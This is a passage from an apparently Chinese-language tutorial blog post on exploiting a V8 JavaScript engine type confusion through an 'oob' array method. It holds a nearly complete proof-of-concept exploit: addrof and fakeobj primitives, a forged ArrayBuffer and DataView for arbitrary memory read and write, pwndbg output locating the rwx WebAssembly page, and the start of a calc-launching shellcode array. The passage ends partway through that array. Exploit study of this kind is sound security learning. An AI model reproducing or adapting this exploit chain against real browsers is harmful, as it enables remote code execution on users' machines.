function_">fakeobj</span>(<span class="title function_">u2d</span>(fake_obj_elements_addr));<span class="comment">//fake obj会利用类型混淆，把传入的地址当作HeapObject Pointer解析</span></span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_array_buffer); <span class="comment">//利用ArrayBuffer创建一个DataView实现任意地址读写</span></span><br></pre></td></tr></table></figure></div><blockquote><p>可以把DataVeiw理解成是用来读写传入的ArrayBuffer的backing store中的值的，而我们再构造ArrayBuffer时，把backing store的长度被我们改得很大(0x4000)，所以可以实现任意地址读写</p></blockquote><h3 id="wasm写shellcode"><a href="#wasm写shellcode" class="headerlink" title="wasm写shellcode"></a>wasm写shellcode</h3><p>web assembly创建的Instance附近有一块权限为rwx的内存，可以写入shellcode，这块内存相对于Instance的偏移也是固定的，现在我们来找一下这个偏移</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,<span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>,<span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]); <span class="comment">//一个简单的main函数</span></span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);<span class="comment">//创建模块</span></span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);<span class="comment">//实例化</span></span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;<span class="comment">//获得导出函数</span></span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasm_instance);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x17f0cf121831</span> &lt;<span class="title class_">Instance</span> map = <span class="number">0x1ac3290c9789</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x17f0cf121831</span></span><br><span class="line"><span class="number">0x17f0cf121831</span>: [<span class="title class_">WasmInstanceObject</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span></span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x1ac3290c9789</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x19ccc870a379</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x1ac3290cabd9</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x03ea86480c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">module_object</span>: <span class="number">0x148cb2f00d31</span> &lt;<span class="title class_">Module</span> map = <span class="number">0x1ac3290c91e9</span>&gt;</span><br><span class="line"> - <span class="attr">exports_object</span>: <span class="number">0x148cb2f00f69</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x1ac3290cad19</span>&gt;</span><br><span class="line"> - <span class="attr">native_context</span>: <span class="number">0x17f0cf101869</span> &lt;<span class="title class_">NativeContext</span>[<span class="number">246</span>]&gt;</span><br><span class="line"> - <span class="attr">memory_object</span>: <span class="number">0x17f0cf121959</span> &lt;<span class="title class_">Memory</span> map = <span class="number">0x1ac3290ca189</span>&gt;</span><br><span class="line"> - table <span class="number">0</span>: <span class="number">0x148cb2f00f01</span> &lt;<span class="title class_">Table</span> map = <span class="number">0x1ac3290c9aa9</span>&gt;</span><br><span class="line"> - <span class="attr">imported_function_refs</span>: <span class="number">0x03ea86480c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">managed_native_allocations</span>: <span class="number">0x148cb2f00ea9</span> &lt;<span class="title class_">Foreign</span>&gt;</span><br><span class="line"> - <span class="attr">memory_start</span>: <span class="number">0x7f1504000000</span></span><br><span class="line"> - <span class="attr">memory_size</span>: <span class="number">65536</span></span><br><span class="line"> - <span class="attr">memory_mask</span>: ffff</span><br><span class="line"> - <span class="attr">imported_function_targets</span>: <span class="number">0x55b83d59f480</span></span><br><span class="line"> - <span class="attr">globals_start</span>: (nil)</span><br><span class="line"> - <span class="attr">imported_mutable_globals</span>: <span class="number">0x55b83d59eaf0</span></span><br><span class="line"> - <span class="attr">indirect_function_table_size</span>: <span class="number">0</span></span><br><span class="line"> - <span class="attr">indirect_function_table_sig_ids</span>: (nil)</span><br><span class="line"> - <span class="attr">indirect_function_table_targets</span>: (nil)</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x03ea86480c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;&#125;</span><br><span class="line">pwndbg&gt; x/80gx <span class="number">0x17f0cf121831</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x17f0cf121830</span>:<span class="number">0x00001ac3290c9789</span><span class="number">0x000003ea86480c71</span></span><br><span class="line"><span class="number">0x17f0cf121840</span>:<span class="number">0x000003ea86480c71</span><span class="number">0x00007f1504000000</span></span><br><span class="line"><span class="number">0x17f0cf121850</span>:<span class="number">0x0000000000010000</span><span class="number">0x000000000000ffff</span></span><br><span class="line"><span class="number">0x17f0cf121860</span>:<span class="number">0x000055b83d5157f8</span><span class="number">0x000003ea86480c71</span></span><br><span class="line"><span class="number">0x17f0cf121870</span>:<span class="number">0x000055b83d59f480</span><span class="number">0x000003ea864804d1</span></span><br><span class="line"><span class="number">0x17f0cf121880</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x17f0cf121890</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x17f0cf1218a0</span>:<span class="number">0x000055b83d59eaf0</span><span class="number">0x000003ea864804d1</span></span><br><span class="line"><span class="number">0x17f0cf1218b0</span>:<span class="number">0x000055b83d50bb30</span><span class="number">0x00001436a173c000</span> 🌟</span><br><span class="line">......</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="attr">LEGEND</span>: <span class="variable constant_">STACK</span> | <span class="variable constant_">HEAP</span> | <span class="variable constant_">CODE</span> | <span class="variable constant_">DATA</span> | <span class="variable constant_">WX</span> | <span class="variable constant_">RODATA</span></span><br><span class="line">             <span class="title class_">Start</span>                <span class="title class_">End</span> <span class="title class_">Perm</span>     <span class="title class_">Size</span> <span class="title class_">Offset</span> <span class="title class_">File</span></span><br><span class="line">     <span class="number">0x10eb3a00000</span>      <span class="number">0x10eb4201000</span> rw-p   <span class="number">801000</span>      <span class="number">0</span> [anon_10eb3a00]</span><br><span class="line">     <span class="number">0x3ea86480000</span>      <span class="number">0x3ea864c0000</span> r--p    <span class="number">40000</span>      <span class="number">0</span> [anon_3ea86480]</span><br><span class="line">     <span class="number">0xf3b02f00000</span>      <span class="number">0xf3b02f40000</span> ---p    <span class="number">40000</span>      <span class="number">0</span> [anon_f3b02f00]</span><br><span class="line">    <span class="number">0x1436a173c000</span>     <span class="number">0x1436a173d000</span> rwxp     <span class="number">1000</span>      <span class="number">0</span> [anon_1436a173c] 🌟</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x00001436a173c000</span></span><br><span class="line"><span class="attr">LEGEND</span>: <span class="variable constant_">STACK</span> | <span class="variable constant_">HEAP</span> | <span class="variable constant_">CODE</span> | <span class="variable constant_">DATA</span> | <span class="variable constant_">WX</span> | <span class="variable constant_">RODATA</span></span><br><span class="line">             <span class="title class_">Start</span>                <span class="title class_">End</span> <span class="title class_">Perm</span>     <span class="title class_">Size</span> <span class="title class_">Offset</span> <span class="title class_">File</span></span><br><span class="line">     <span class="number">0xf3b02f00000</span>      <span class="number">0xf3b02f40000</span> ---p    <span class="number">40000</span>      <span class="number">0</span> [anon_f3b02f00]</span><br><span class="line">►   <span class="number">0x1436a173c000</span>     <span class="number">0x1436a173d000</span> rwxp     <span class="number">1000</span>      <span class="number">0</span> [anon_1436a173c] +<span class="number">0x0</span></span><br><span class="line">    <span class="number">0x1436a173d000</span>     <span class="number">0x1436e173c000</span> ---p 3ffff000      <span class="number">0</span> [anon_1436a173d]</span><br><span class="line">pwndbg&gt; p/x <span class="number">0x17f0cf1218b8</span>-(<span class="number">0x17f0cf121831</span>-<span class="number">1</span>) <span class="comment">//rwx内存相对于Instance的偏移</span></span><br><span class="line">$3 = <span class="number">0x88</span></span><br></pre></td></tr></table></figure></div><blockquote><p>这样就可以得到偏移是0x88了</p></blockquote><p>接下来就需要利用之前构造的DataView来任意地址读写了，需要实现一些工具function</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">get_32</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_ab_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_64</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_ab_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);<span class="comment">//把backing store*改成要读取的地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(dv.<span class="title function_">getFloat64</span>(<span class="number">0</span>, <span class="literal">true</span>));<span class="comment">//getFloat64函数可以获得backing store*(现在已经被替换成任意地址)中的值，第一个参数是偏移，第二个参数是大小端，true表示小端</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_32</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    fake_ab_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setUint32</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_64</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    fake_ab_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);<span class="comment">//写入任意地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h3><p>实际上前面的工作就是创建一个JSArray(<code>fake_array_buffer_obj</code>)，然后为了利用ArrayBuffer的Backing Store和DataView来实现任意地址读写，<code>fake_array_buffer_obj</code>数组元素是构造好一个ArrayBuffer的内存布局，后面构造fake map等一系列操作其实就是把<code>fake_array_buffer_obj</code>的Elements改造成一个<code>ArrayBuffer</code>，这也是为什么最后得到<code>fake_array_buffer</code>时传入<code>fakeobj</code>的其实是<code>fake_array_buffer_obj</code>的Elements的address，之后在寻找wasm instance附近的权限为rwx的内存的偏移，最后只要利用这些工具类写入shellcode就行了，这里简单使用一个弹计算器的shellcode</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">const</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buf);</span><br><span class="line"><span class="comment">// Floating point to 64-bit unsigned integer</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="title class_">Array</span>.<span class="title function_">from</span>(u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64-bit unsigned integer to Floating point</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        u32.<span class="title function_">set</span>(tmp);</span><br><span class="line">        <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 32-bit unsigned integer to hex **string**</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj_param</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">    <span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">    double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr[<span class="number">0</span>] = obj_param;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(double_arr.<span class="title function_">oob</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(obj_arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeobj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">    <span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">    double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    double_arr[<span class="number">0</span>] = addr;</span><br><span class="line">    double_arr.<span class="title function_">oob</span>(obj_arr.<span class="title function_">oob</span>());<span class="comment">//替换map*</span></span><br><span class="line">    <span class="keyword">return</span> double_arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">gc</span>();<span class="title function_">gc</span>();</span><br><span class="line"><span class="keyword">let</span> fake_array_buffer_obj = [</span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//map*, properties （properties只要不去访问，设置成0也没事）</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x4000</span>), <span class="comment">//elements, length</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">2</span>), <span class="comment">//backing_store, embedder fields</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//padding, padding</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x1900042319080808</span>), <span class="comment">//fake map</span></span><br><span class="line">];</span><br><span class="line"><span class="title function_">gc</span>();<span class="title function_">gc</span>();</span><br><span class="line"><span class="keyword">let</span> fake_obj_elements_addr = <span class="title function_">addrof</span>(fake_array_buffer_obj) + <span class="number">0x48</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake obj elements addr is:&quot;</span>+<span class="title function_">hex</span>(fake_obj_elements_addr));</span><br><span class="line"><span class="keyword">let</span> array_buffer_obj_map_addr = fake_obj_elements_addr + <span class="number">64</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake array buffer&#x27;s map addr is:&quot;</span>+<span class="title function_">hex</span>( array_buffer_obj_map_addr));</span><br><span class="line">fake_array_buffer_obj[<span class="number">0</span>]=<span class="title function_">u2d</span>(array_buffer_obj_map_addr);<span class="comment">//fake map的地址替换</span></span><br><span class="line"><span class="keyword">let</span> fake_array_buffer = <span class="title function_">fakeobj</span>(<span class="title function_">u2d</span>(fake_obj_elements_addr));<span class="comment">//fake obj会利用类型混淆，把传入的地址当作HeapObject Pointer解析</span></span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,<span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>,<span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>,<span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);<span class="comment">//一个简单的main函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_i_addr = <span class="title function_">addrof</span>(wasm_instance);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_32</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_array_buffer_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_64</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_array_buffer_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);<span class="comment">//把backing store*改成要读取的地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(dv.<span class="title function_">getFloat64</span>(<span class="number">0</span>, <span class="literal">true</span>));<span class="comment">//getFloat64函数可以获得backing store*(现在已经被替换成任意地址)中的值，第一个参数是偏移，第二个参数是大小端，true表示小端</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_32</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    fake_array_buffer_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setUint32</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_64</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    fake_array_buffer_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);<span class="comment">//写入任意地址</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> rwx_addr = <span class="title function_">get_64</span>((wasm_i_addr + <span class="number">0x88</span> - <span class="number">1</span>)); <span class="comment">//-1是因为Tagged Value</span></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;[+] rwx_addr : &#x27;</span> + <span class="title function_">hex</span>(rwx_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sc = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">21</span>);</span><br><span class="line">sc[<span class="number">0</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">sc[<span class="number">1</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">sc[<span class="number">2</span>] = <span class="number">0x782fb848</span>;</span><br><span class="line">sc[<span class="number">3</span>] = <span class="number">0x636c6163</span>;</span><br><span class="line">sc[<span class="number">4</span>] = <span class="number">0x48500000</span>;</span><br><span class="line">sc[<span class="number">5</span>] = <span class="number">0x73752fb8</span>;</span><br><span class="line">sc[<span class="number">6</span>] = <span class="number">0x69622f72</span>;</span><br><span class="line">sc[<span class="number">7</span>] = <span class="number">0x8948506e</span>;</span><br><span class="line">sc[<span class="number">8</span>] = <span class="number">0xc03148e7</span>;</span><br><span class="line">sc[<span class="number">9</span>] = <span class="number">0x89485750</span>;</span><br><span class="line">sc[<span class="number">10</span>] = <span class="number">0xd23148e6</span>;</span><br><span class="line">sc[<span class="number">11</span>] = <span 